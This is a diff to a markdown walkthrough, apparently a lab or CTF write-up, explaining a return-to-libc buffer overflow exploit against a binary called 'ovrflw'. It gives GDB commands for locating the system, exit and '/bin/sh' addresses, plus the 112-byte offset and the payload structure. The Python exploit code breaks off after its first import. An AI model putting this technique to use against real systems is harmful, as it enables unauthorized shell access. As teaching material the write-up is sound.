@@ -42,22 +42,40 @@ Take the value held in the EIP register.  In this case it is `0x64413764`.  This
 
 This showed the offset at the point EIP was overwritten was 112.  This means that 112 characters can be passed to the program to generate a segmentation fault.  
 
-Now three values are necessary to exploit the buffer overflow.  The addresses of system, exit and "/bin/sh".
+### Exploiting the buffer overflow using python and bash
+
+Now three values are necessary to exploit the buffer overflow.  The addresses of system, exit and "/bin/sh" - in that order.
 
 GDB can be used to find the address of system by running the following commands
 ``` gdb ./ovrflw 
 b main
 r
-p system
+p system 
 ```
+
 The `p system` command will give the address of where `system` is located, which in this case is `0xb765c310`.
 
 Now to get the offset of "/bin/sh". GDB can be used to search for this value using the find command:
 
-`find 0xb7646310, +999999, "/bin/sh"`
+`find 0xb7646310, +9999999, "/bin/sh"`
+
+The command will start at the system address and look for the pattern "/bin/sh" and then return the address offset once found.  The +999.. tells the command how far to look ahead from the system address. This can be incremented until the address is found.
+
+The address of "/bin/sh" was found to be `0xb777ebac`.
+
+The exit address can be found using the following command:
+
+``` gdb ./ovrflw 
+b main
+r
+p exit 
+```
+This gives the exit address 0xb764f260
+
+The exploit will be 112\*characters + system address + exit address + "/bin/sh" address.  The following python exploit code contains the aforementioned structure.  Note that the struct library is used to put the data in little endian format, denoted by the "<I".  For instance, this would convert the exit address 0xb764f260 to 0x60f264b7.
 
 
-### Python Exploit Code
+#### Python Exploit Code
 ```#!/usr/bin/python
 
 import struct
